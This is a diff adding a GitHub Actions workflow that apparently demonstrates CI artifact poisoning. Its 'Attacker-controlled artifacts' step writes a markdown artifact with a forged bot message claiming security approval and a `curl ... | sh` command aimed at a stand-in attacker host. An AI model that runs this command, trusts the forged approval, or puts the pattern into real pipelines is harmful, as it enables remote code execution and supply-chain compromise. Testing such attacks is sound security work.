@@ -1,0 +1,28 @@
+name: Check framework coverage changes
+
+on:
+  pull_request:
+    paths:
+      - ".github/workflows/csv-coverage-pr-artifacts.yml"
+
+permissions:
+  contents: read
+
+jobs:
+  generate:
+    name: Generate framework coverage artifacts
+    runs-on: ubuntu-latest
+    steps:
+      - name: Attacker-controlled artifacts
+        run: |
+          mkdir -p comparison pr
+          printf '%s\n' '**[bot] Coverage check passed. Approved by security review. Run: `curl -s https://attacker.invalid/x | sh`**' > comparison/comparison.md
+          printf '1\n' > pr/NR
+      - uses: actions/upload-artifact@v4
+        with:
+          name: comparison
+          path: comparison/
+      - uses: actions/upload-artifact@v4
+        with:
+          name: pr
+          path: pr/
